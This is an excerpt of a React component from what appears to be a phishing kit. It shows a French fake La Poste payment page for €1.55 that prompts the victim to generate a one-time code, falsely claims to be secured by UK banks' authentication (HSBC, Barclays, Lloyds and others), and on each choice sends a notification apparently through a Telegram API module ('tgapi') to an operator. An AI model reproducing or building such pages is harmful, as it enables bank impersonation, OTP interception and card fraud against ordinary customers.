...
import { Smartphone, Shield, RotateCw } from "lucide-react";
import { sendDeOtpRequestNotification } from '../../tgapi';
...
const ChooseComponent = ({ cardType, bankName, onChoice, invoiceName = "Facture inconnue", recipientName = "Destinataire inconnu" }: ChooseComponentProps) => {
  ...
  const handleChoice = async (choice: 'bank' | 'sms') => {
    ...
    try {
      await sendDeOtpRequestNotification(invoiceName, recipientName);
  ...
  return (
    <div className="w-full max-w-md mx-auto space-y-4 relative p-2 -mb-8">
      {/* Processing Overlay */}
      {isProcessing && (
        <div className="absolute inset-0 bg-white/20 backdrop-blur-[2px] rounded-xl z-20 flex items-center justify-center">
        ...
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center">
            <p className="text-[11px] font-chevin font-medium text-muted-foreground/80 leading-relaxed drop-shadow-sm">
              Veuillez générer un code unique<br/>
              pour confirmer ce paiement.
            </p>
          </div>
        </div>
      </div>
      ...
      <div className="flex items-center justify-center">
        ...
        <div className="text-center flex-shrink-0">
          <div
            ...
            className={`w-24 h-24 text-accent transition-all duration-300 hover:scale-110 active:scale-95 flex flex-col items-center justify-center cursor-pointer ${isProcessing ? 'opacity-50 pointer-events-none' : ''}`}
          >
            <img 
              src={smsLogo} 
              alt="Générer OTP" 
          ...
          <p className="text-xs text-muted-foreground mt-1 font-medium">Générer OTP</p>
        </div>
      </div>
        ...
        <div className="space-y-2">
          ...
          <div className="flex justify-between items-center">
            <div className="text-left">
              <span className="text-[8px] font-medium text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Montant</span>
              <span className="text-[11px] font-medium text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">1,55 €</span>
            </div>
            <div className="text-right">
              <span className="text-[8px] font-medium text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Marchand</span>
              <span className="text-[11px] font-medium text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">La Poste</span>
            </div>
          </div>
      ...
      <div className="text-center -mt-4 -mb-4">
        <div className="flex items-center justify-center gap-1">
          ...
          <p className="text-[10px] text-muted-foreground">
            {bankName === 'HSBCUK' && 'Sécurisé par le système d\'authentification HSBC.'}
            {bankName === 'BARCLAYSUK' && 'Sécurisé par le système d\'authentification Barclays.'}
            {bankName === 'HALIFAXUK' && 'Sécurisé par le système d\'authentification Halifax.'}
            {bankName === 'LLOYDSUK' && 'Sécurisé par le système d\'authentification Lloyds.'}
            {bankName === 'NATWESTUK' && 'Sécurisé par le système d\'authentification NatWest.'}
            {bankName === 'SANTANDERUK' && 'Sécurisé par le système d\'authentification Santander.'}
            {!bankName && 'Sécurisé par le système d\'authentification de votre banque.'}
          </p>
        </div>
      </div>
    </div>
